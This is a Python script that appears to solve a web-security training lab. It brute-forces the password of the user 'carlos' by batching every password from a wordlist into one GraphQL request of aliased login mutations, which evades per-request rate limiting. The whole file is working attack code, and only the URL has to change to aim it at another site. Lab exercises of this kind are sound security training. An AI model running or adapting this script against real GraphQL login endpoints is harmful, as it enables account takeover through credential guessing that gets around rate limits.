import requests
import json
import sys

LAB_ID_URL = "https://0a93004e04e3b29d803971d100630082.web-security-academy.net"
TARGET_URL = f"{LAB_ID_URL}/graphql/v1"
PASSWORD_FILE = "passwords.txt"
USERNAME = "carlos"

def solve_lab():
    try:
        with open(PASSWORD_FILE, "r") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("Error: File passwords.txt not found.")
        return

    if not passwords:
        print("Error: Password list is empty.")
        return

    mutation_body = ""
    for i, pwd in enumerate(passwords):
        mutation_body += f'brute{i}:login(input:{{password: "{pwd}", username: "{USERNAME}"}}) {{ token success }} '
    
    full_query = f"mutation {{ {mutation_body} }}"
    
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    }

    try:
        response = requests.post(TARGET_URL, json={"query": full_query}, headers=headers)
        
        if response.status_code == 200:
            data = response.json().get("data", {})
            if data:
                found = False
                for alias, result in data.items():
                    if result and result.get("success") is True:
                        index = int(alias.replace("brute", ""))
                        print(f"FOUND: {passwords[index]}")
                        found = True
                        break
                if not found:
                    print("Password not found in the list.")
            else:
                print("Response data is empty.")
        else:
            print(f"HTTP Error: {response.status_code}")
            
    except Exception as e:
        print(f"Connection Error: {e}")

if __name__ == "__main__":
    solve_lab()